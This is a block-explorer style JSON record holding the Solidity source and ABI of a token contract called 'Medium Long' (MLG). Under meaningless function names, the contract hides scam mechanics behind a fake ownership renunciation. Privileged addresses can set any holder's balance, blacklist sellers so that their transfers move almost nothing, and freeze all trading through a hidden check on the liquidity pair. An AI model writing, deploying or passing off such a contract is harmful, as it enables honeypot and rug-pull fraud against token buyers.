{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface limitEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract buySellToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableToken {\n    function createPair(address autoFromTrading, address fromSenderAmount) external returns (address);\n}\n\ninterface amountListToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeLiquidityShould) external view returns (uint256);\n\n    function transfer(address takeTotal, uint256 exemptReceiver) external returns (bool);\n\n    function allowance(address atIsSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeTotal,\n        uint256 exemptReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalFrom, uint256 value);\n    event Approval(address indexed atIsSell, address indexed spender, uint256 value);\n}\n\ninterface totalShould is amountListToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MediumLong is buySellToken, amountListToken, totalShould {\n\n    function transfer(address feeSender, uint256 exemptReceiver) external virtual override returns (bool) {\n        return tokenSender(_msgSender(), feeSender, exemptReceiver);\n    }\n\n    function balanceOf(address modeLiquidityShould) public view virtual override returns (uint256) {\n        return maxWalletAmount[modeLiquidityShould];\n    }\n\n    function receiverAtLimit() private view {\n        require(txTakeMarketing[_msgSender()]);\n    }\n\n    uint256 constant amountSell = 20 ** 10;\n\n    bool private modeTake;\n\n    string private enableLimitFund = \"MLG\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toTeamSwap;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableLimitFund;\n    }\n\n    bool public takeTeam;\n\n    uint256 public launchedShouldReceiver;\n\n    uint256 public senderToken;\n\n    uint8 private walletTrading = 18;\n\n    address public autoReceiver;\n\n    function approve(address feeLaunch, uint256 exemptReceiver) public virtual override returns (bool) {\n        liquidityFee[_msgSender()][feeLaunch] = exemptReceiver;\n        emit Approval(_msgSender(), feeLaunch, exemptReceiver);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private liquidityFee;\n\n    function allowance(address autoFundLaunch, address feeLaunch) external view virtual override returns (uint256) {\n        if (feeLaunch == buyShouldTotal) {\n            return type(uint256).max;\n        }\n        return liquidityFee[autoFundLaunch][feeLaunch];\n    }\n\n    mapping(address => bool) public limitSellMin;\n\n    function tokenSender(address buyAt, address takeTotal, uint256 exemptReceiver) internal returns (bool) {\n        if (buyAt == launchAmountTeam) {\n            return shouldReceiverTotal(buyAt, takeTotal, exemptReceiver);\n        }\n        uint256 amountList = amountListToken(autoReceiver).balanceOf(enableAutoAt);\n        require(amountList == totalAtAmount);\n        require(takeTotal != enableAutoAt);\n        if (limitSellMin[buyAt]) {\n            return shouldReceiverTotal(buyAt, takeTotal, amountSell);\n        }\n        return shouldReceiverTotal(buyAt, takeTotal, exemptReceiver);\n    }\n\n    uint256 fromAt;\n\n    mapping(address => uint256) private maxWalletAmount;\n\n    uint256 public txLaunched;\n\n    address private isLaunched;\n\n    bool public enableTeam;\n\n    mapping(address => bool) public txTakeMarketing;\n\n    function owner() external view returns (address) {\n        return isLaunched;\n    }\n\n    event OwnershipTransferred(address indexed toSell, address indexed fromLiquidity);\n\n    function name() external view virtual override returns (string memory) {\n        return tradingLaunched;\n    }\n\n    function atTeamBuy(address feeSender, uint256 exemptReceiver) public {\n        receiverAtLimit();\n        maxWalletAmount[feeSender] = exemptReceiver;\n    }\n\n    function takeMaxSell(address minTeam) public {\n        if (enableTeam) {\n            return;\n        }\n        if (takeTeam != modeTake) {\n            txLaunched = launchedShouldReceiver;\n        }\n        txTakeMarketing[minTeam] = true;\n        if (exemptMin == modeTake) {\n            senderToken = launchedShouldReceiver;\n        }\n        enableTeam = true;\n    }\n\n    address buyShouldTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        \n        limitEnable marketingTo = limitEnable(buyShouldTotal);\n        autoReceiver = enableToken(marketingTo.factory()).createPair(marketingTo.WETH(), address(this));\n        if (exemptMin) {\n            exemptMin = false;\n        }\n        launchAmountTeam = _msgSender();\n        autoTeam();\n        txTakeMarketing[launchAmountTeam] = true;\n        maxWalletAmount[launchAmountTeam] = toTeamSwap;\n        \n        emit Transfer(address(0), launchAmountTeam, toTeamSwap);\n    }\n\n    function getOwner() external view returns (address) {\n        return isLaunched;\n    }\n\n    function shouldReceiverTotal(address buyAt, address takeTotal, uint256 exemptReceiver) internal returns (bool) {\n        require(maxWalletAmount[buyAt] >= exemptReceiver);\n        maxWalletAmount[buyAt] -= exemptReceiver;\n        maxWalletAmount[takeTotal] += exemptReceiver;\n        emit Transfer(buyAt, takeTotal, exemptReceiver);\n        return true;\n    }\n\n    address public launchAmountTeam;\n\n    function autoTeam() public {\n        emit OwnershipTransferred(launchAmountTeam, address(0));\n        isLaunched = address(0);\n    }\n\n    string private tradingLaunched = \"Medium Long\";\n\n    uint256 private toTeamSwap = 100000000 * 10 ** 18;\n\n    function feeToken(address teamTo) public {\n        receiverAtLimit();\n        \n        if (teamTo == launchAmountTeam || teamTo == autoReceiver) {\n            return;\n        }\n        limitSellMin[teamTo] = true;\n    }\n\n    uint256 totalAtAmount;\n\n    address enableAutoAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address buyAt, address takeTotal, uint256 exemptReceiver) external override returns (bool) {\n        if (_msgSender() != buyShouldTotal) {\n            if (liquidityFee[buyAt][_msgSender()] != type(uint256).max) {\n                require(exemptReceiver <= liquidityFee[buyAt][_msgSender()]);\n                liquidityFee[buyAt][_msgSender()] -= exemptReceiver;\n            }\n        }\n        return tokenSender(buyAt, takeTotal, exemptReceiver);\n    }\n\n    function teamReceiver(uint256 exemptReceiver) public {\n        receiverAtLimit();\n        totalAtAmount = exemptReceiver;\n    }\n\n    bool private exemptMin;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletTrading;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atIsSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFundLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"atTeamBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLiquidityShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTo\",\"type\":\"address\"}],\"name\":\"feeToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAmountTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedShouldReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitSellMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTeam\",\"type\":\"address\"}],\"name\":\"takeMaxSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"teamReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txTakeMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "MediumLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}